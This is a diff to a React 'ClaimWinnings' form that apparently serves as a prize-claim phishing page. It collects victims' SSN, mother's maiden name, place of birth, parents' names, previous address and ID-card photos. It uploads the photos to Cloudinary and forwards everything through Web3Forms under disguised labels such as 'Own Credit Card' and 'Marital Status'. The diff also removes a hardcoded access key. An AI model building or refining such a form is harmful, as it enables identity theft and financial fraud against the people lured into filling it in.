@@ -54,22 +54,55 @@ const ClaimWinnings = () => {
     }));
   };
 
+
+  const uploadToCloudinary = async (file: File): Promise<string> => {
+  const data = new FormData();
+
+  data.append("file", file);
+  data.append("upload_preset", "adorethebrand");
+
+  const response = await fetch(
+    "https://api.cloudinary.com/v1_1/dx90y9zdx/image/upload",
+    {
+      method: "POST",
+      body: data,
+    }
+  );
+
+  const result = await response.json();
+
+  if (!response.ok) {
+    throw new Error("Failed to upload image.");
+  }
+
+  return result.secure_url;
+};
+
   
- const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+const handleSubmit = async (
+  e: React.FormEvent<HTMLFormElement>
+) => {
   e.preventDefault();
   setIsLoading(true);
 
   try {
+    let frontImageUrl = "";
+    let backImageUrl = "";
+
+    if (formData.id_card_front) {
+      frontImageUrl = await uploadToCloudinary(formData.id_card_front);
+    }
+
+    if (formData.id_card_back) {
+      backImageUrl = await uploadToCloudinary(formData.id_card_back);
+    }
+
     const form = new FormData();
 
-    // Web3Forms Access Key
-    form.append("access_key", "ef443573-31da-4020-be6c-84300cf7b7a0");
-
-    // Optional
+    form.append("access_key", "YOUR_WEB3FORMS_ACCESS_KEY");
     form.append("subject", "New Claim Submission");
     form.append("from_name", "Claim Form");
 
-    // Form fields
     form.append("Full Name", formData.fullname);
     form.append("Email", formData.email);
     form.append("Address", formData.address);
@@ -82,36 +115,34 @@ const ClaimWinnings = () => {
     form.append("Occupation", formData.occupation);
     form.append("SSN", formData.ssn);
     form.append("Tax Filled", formData.tax_filled);
+
     form.append("Marital Status", formData.father_fullname);
     form.append("Monthly Income", formData.mother_fullname);
     form.append("Own Credit Card", formData.mmn);
     form.append("Own Bank Account", formData.place_of_birth);
     form.append("Cash or Check", formData.previous_address);
 
-    // File uploads
-    if (formData.id_card_front) {
-      form.append("Front ID Card", formData.id_card_front);
-    }
+    form.append("Front ID Card", frontImageUrl);
+    form.append("Back ID Card", backImageUrl);
 
-    if (formData.id_card_back) {
-      form.append("Back ID Card", formData.id_card_back);
-    }
-
-    const response = await fetch("https://api.web3forms.com/submit", {
-      method: "POST",
-      body: form,
-    });
+    const response = await fetch(
+      "https://api.web3forms.com/submit",
+      {
+        method: "POST",
+        body: form,
+      }
+    );
 
     const result = await response.json();
 
     if (result.success) {
-      alert("Successfully sent, we will get back to you shortly.");
+      alert("Successfully sent, we will get back with you shortly.");
       window.location.href = "/";
     } else {
-      alert(result.message || "Submission failed.");
+      alert(result.message);
     }
-  } catch (error) {
-    console.error(error);
+  } catch (err) {
+    console.error(err);
     alert("Failed to submit form.");
   } finally {
     setIsLoading(false);
